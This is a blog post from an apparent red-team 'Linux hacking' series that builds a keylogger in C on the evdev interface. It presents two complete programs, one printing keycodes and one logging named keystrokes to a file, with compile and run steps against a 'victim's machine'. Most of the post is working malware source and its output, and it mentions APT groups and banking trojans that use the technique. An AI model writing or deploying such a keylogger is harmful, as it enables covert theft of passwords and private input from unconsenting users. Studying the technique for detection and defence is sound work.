---
title:  "Linux hacking part 5: building a Linux keylogger. Simple C example"
date:   2025-06-03 02:00:00 +0200
header:
  teaser: "/assets/images/157/2025-06-08_14-41_1.png"
categories:
  - linux
tags:
  - red team
  - linux
  - malware
  - apt
  - keylogging
---

﷽

Hello, cybersecurity enthusiasts and white hackers!        

![malware](/assets/images/157/2025-06-08_14-41_1.png){:class="img-responsive"}    

I continue my series of posts about Linux hacking and linux malware. This is a short but interesting post, we will build a keylogger for Linux using the `evdev` interface to capture keyboard input.     

This technique is commonly used in penetration testing and malware research. While keyloggers can be used for malicious purposes, understanding how they work is also crucial for defending against them.     

Simple Windows keylogger example from my [blog](/malware/2025/05/01/malware-tricks-46.html).      

### basics of keylogging on Linux

On Linux, keyboard input events are managed by the `evdev` subsystem. Every keypress is treated as an `input_event`, which is sent to `/dev/input/eventX` devices. By reading from these event devices, we can capture the raw keypresses (keycodes) and map them to human-readable characters using a predefined mapping.     

### practical example

First of all, we'll write a simple keylogger in C, which will monitor keyboard input from `/dev/input/event*` devices.      

But before we start, I need identify the correct `event*` device. Run the following command to list the devices:     

```bash
ls /dev/input/by-path/
```

![malware](/assets/images/157/2025-06-08_13-37.png){:class="img-responsive"}    

Look for devices with names like `kbd` or `keyboard`. As you can see, in my victim's device lubuntu 24.04 is `event1`.     

You can also list devices using `dmesg` to find the exact path:     

```bash
dmesg | grep -i "keyboard"
```

Once we identify the correct device (e.g., `/dev/input/event1`), we can proceed with the keylogger.     

The logic is pretty simple, opening the device:    

```cpp
const char *dev = "/dev/input/event1";
int fd = open(dev, O_RDONLY);
if (fd < 0) {
  perror("open");
  return 1;
}
```

Our malware opens the `/dev/input/event1` device, which is a virtual file that provides events related to input devices (keyboard in this case).     

Then just reading the input events:     

```cpp
struct input_event ev;
ssize_t n = read(fd, &ev, sizeof(struct input_event));
if (n == (ssize_t)sizeof(struct input_event)) {
  if (ev.type == EV_KEY && ev.value == 1) { // keydown
    printf("keycode: %d\n\n", ev.code);
    fflush(stdout);
    if (ev.code == 1) { // 1 = ESC
      printf("ESC pressed, exiting.\n");
      break;
    }
  }
}
```

We read events from the device into a struct of type `input_event`, which contains information about the event (such as the type, code, and value). For every key press (`keydown`), we print the keycode (which corresponds to the physical key on the keyboard). If the keycode is `1` (which corresponds to the `ESC` key), the program prints a message and exits the loop, terminating the keylogger.      

So full source code for the simplest one is looks like this `hack.c`:     

```cpp
/*
 * hack.c
 * simple linux keylogger
 * author @cocomelonc
 * https://cocomelonc.github.io/linux/2025/06/03/linux-hacking-5.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  // ls -l /dev/input/by-path/ | grep kbd
  const char *dev = "/dev/input/event1";
  struct input_event ev;
  int fd = open(dev, O_RDONLY);
  if (fd < 0) {
    perror("open");
    return 1;
  }
  printf("keylogger started. press ESC to exit.\n");
  while (1) {
    ssize_t n = read(fd, &ev, sizeof(struct input_event));
    if (n == (ssize_t)sizeof(struct input_event)) {
      if (ev.type == EV_KEY && ev.value == 1) { // keydown
        printf("keycode: %d\n\n", ev.code);
        fflush(stdout);
        if (ev.code == 1) { // 1 = ESC
          printf("ESC pressed, exiting.\n");
          break;
        }
      }
    }
  }
  close(fd);
  return 0;
}
```

To access `/dev/input/event1`, we need root privileges because it is a system device.     

### demo

Let's go to see everything in action. Compile it:    

```bash
gcc -o hack ./hack.c
```

![malware](/assets/images/157/2025-06-08_13-36.png){:class="img-responsive"}    

And when we run this keylogger, we will see the keycode for each key pressed on the keyboard:     

```bash
./hack
```

![malware](../assets/images/157/2025-06-08_14-39.png){:class="img-responsive"}    

As you can see, everything is worked perfectly! =^..^=    

### practical example 2

What about translating keycodes into human-readable key names? For this reason add some modifications, and we need this function:    

```cpp
const char *keycode_to_string(unsigned int code) {
  switch (code) {
    case KEY_ESC: return "ESC";
    case KEY_1: return "1";
    case KEY_2: return "2";
    case KEY_3: return "3";
    case KEY_4: return "4";
    case KEY_5: return "5";
    case KEY_6: return "6";
    case KEY_7: return "7";
    case KEY_8: return "8";
    case KEY_9: return "9";
    case KEY_0: return "0";
    case KEY_Q: return "Q";
    case KEY_W: return "W";
    case KEY_E: return "E";
    case KEY_R: return "R";
    case KEY_T: return "T";
    case KEY_Y: return "Y";
    case KEY_U: return "U";
    case KEY_I: return "I";
    case KEY_O: return "O";
    case KEY_P: return "P";
    case KEY_A: return "A";
    case KEY_S: return "S";
    case KEY_D: return "D";
    case KEY_F: return "F";
    case KEY_G: return "G";
    case KEY_H: return "H";
    case KEY_J: return "J";
    case KEY_K: return "K";
    case KEY_L: return "L";
    case KEY_Z: return "Z";
    case KEY_X: return "X";
    case KEY_C: return "C";
    case KEY_V: return "V";
    case KEY_B: return "B";
    case KEY_N: return "N";
    case KEY_M: return "M";
    case KEY_SPACE: return "SPACE";
    case KEY_ENTER: return "ENTER";
    case KEY_BACKSPACE: return "BACKSPACE";
    case KEY_TAB: return "TAB";
    case KEY_LEFTSHIFT: return "LEFTSHIFT";
    case KEY_RIGHTSHIFT: return "RIGHTSHIFT";
    case KEY_LEFTCTRL: return "LEFTCTRL";
    case KEY_RIGHTCTRL: return "RIGHTCTRL";
    case KEY_F1: return "F1";
    case KEY_F2: return "F2";
    default: return "UNKNOWN";
  }
}
```

Of course, you can extend `keycode_to_string` to all keycodes from `<linux/input-event-codes.h>`:     

```bash
/usr/include/linux/input-event-codes.h
```

![malware](/assets/images/157/2025-06-08_15-35.png){:class="img-responsive"}    

and write to file logic:     

```cpp
FILE *logfile = fopen("keylog.txt", "a");
if (!logfile) {
  perror("fopen");
  return 1;
}

//....

if (n == (ssize_t)sizeof(struct input_event)) {
  if (ev.type == EV_KEY && ev.value == 1) { // keydown
    const char *keyname = keycode_to_string(ev.code);
    printf("key pressed: %s (code %d)\n", keyname, ev.code);
    fprintf(logfile, "%s\n", keyname);
    fflush(logfile);
    if (ev.code == KEY_ESC) {
      printf("ESC pressed, exiting.\n");
      break;
    }
  }
}

//...
```

Full source code looks like this (`hack2.c`):     

```cpp
/*
 * hack2.c
 * simple linux keylogger
 * save to file (key strings)
 * author @cocomelonc
 * https://cocomelonc.github.io/linux/2025/06/03/linux-hacking-5.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>

const char *keycode_to_string(unsigned int code) {
  switch (code) {
    case KEY_ESC: return "ESC";
    case KEY_1: return "1";
    case KEY_2: return "2";
    case KEY_3: return "3";
    case KEY_4: return "4";
    case KEY_5: return "5";
    case KEY_6: return "6";
    case KEY_7: return "7";
    case KEY_8: return "8";
    case KEY_9: return "9";
    case KEY_0: return "0";
    case KEY_Q: return "Q";
    case KEY_W: return "W";
    case KEY_E: return "E";
    case KEY_R: return "R";
    case KEY_T: return "T";
    case KEY_Y: return "Y";
    case KEY_U: return "U";
    case KEY_I: return "I";
    case KEY_O: return "O";
    case KEY_P: return "P";
    case KEY_A: return "A";
    case KEY_S: return "S";
    case KEY_D: return "D";
    case KEY_F: return "F";
    case KEY_G: return "G";
    case KEY_H: return "H";
    case KEY_J: return "J";
    case KEY_K: return "K";
    case KEY_L: return "L";
    case KEY_Z: return "Z";
    case KEY_X: return "X";
    case KEY_C: return "C";
    case KEY_V: return "V";
    case KEY_B: return "B";
    case KEY_N: return "N";
    case KEY_M: return "M";
    case KEY_SPACE: return "SPACE";
    case KEY_ENTER: return "ENTER";
    case KEY_BACKSPACE: return "BACKSPACE";
    case KEY_TAB: return "TAB";
    case KEY_LEFTSHIFT: return "LEFTSHIFT";
    case KEY_RIGHTSHIFT: return "RIGHTSHIFT";
    case KEY_LEFTCTRL: return "LEFTCTRL";
    case KEY_RIGHTCTRL: return "RIGHTCTRL";
    case KEY_F1: return "F1";
    case KEY_F2: return "F2";
    default: return "UNKNOWN";
  }
}

int main(int argc, char *argv[]) {
  const char *dev = "/dev/input/event1"; // in my case event1
  struct input_event ev;
  FILE *logfile = fopen("keylog.txt", "a");
  if (!logfile) {
    perror("fopen");
    return 1;
  }

  int fd = open(dev, O_RDONLY);
  if (fd < 0) {
    perror("open");
    fclose(logfile);
    return 1;
  }
  printf("keylogger started. press ESC to exit.\n");
  while (1) {
    ssize_t n = read(fd, &ev, sizeof(struct input_event));
    if (n == (ssize_t)sizeof(struct input_event)) {
      if (ev.type == EV_KEY && ev.value == 1) { // keydown
        const char *keyname = keycode_to_string(ev.code);
        printf("key pressed: %s (code %d)\n", keyname, ev.code);
        fprintf(logfile, "%s\n", keyname);
        fflush(logfile);
        if (ev.code == KEY_ESC) {
          printf("ESC pressed, exiting.\n");
          break;
        }
      }
    }
  }

  close(fd);
  fclose(logfile);
  return 0;
}
```

If desired, you can even display Unicode symbols (more difficult - requires a keyboard layout)       

### demo 2

Let's go to see second example in action. Compie it:    

```bash
gcc -o hack2 hack2.c
```

![malware](/assets/images/157/2025-06-08_13-36_1.png){:class="img-responsive"}    

Then run it at the victim's machine (`lubuntu 24.04` in my case):     

```bash
./hack2
```

![malware](/assets/images/157/2025-06-08_14-40.png){:class="img-responsive"}    

![malware](/assets/images/157/2025-06-08_14-41.png){:class="img-responsive"}    

The keylogger will continue running until the `ESC` key is pressed. Once detected, it will stop and exit.      

As you can see, it's also worked perfectly as expected! =^..^=     

This building a keylogger on Linux is a powerful exercise to understand how input events are managed and intercepted in the operating system.     

It's a straightforward example of how attackers might exploit system weaknesses, but it also provides insight into building better defense mechanisms against such threats.     

Using `/dev/input/event*` to intercept keyboard input (via `evdev`) is a classic technique that can be used in both APT attacks and more general malware tools.       

This keylogging trick is used by [APT28](https://attack.mitre.org/groups/G0007) and [APT33](https://attack.mitre.org/groups/G0064/) groups in the wild.     

Banking Trojans for Linux also often use keyloggers to obtain sensitive data such as passwords for banking applications and cryptographic keys.      

I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.      

[Simple Windows keylogger example](https://cocomelonc.github.io/malware/2025/05/01/malware-tricks-46.html)      
[Linux malware development 1: intro to kernel hacking. Simple C example](/linux/2024/06/20/linux-kernel-hacking-1.html)      
[Linux malware development 2: find process ID by name. Simple C example](/linux/2024/09/16/linux-hacking-2.html)      
[APT28](https://attack.mitre.org/groups/G0007)     
[APT33](https://attack.mitre.org/groups/G0064/)       
[source code in github](https://github.com/cocomelonc/meow/tree/master/2025-06-03-linux-hacking-5)    

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!         
*PS. All drawings and screenshots are mine*       
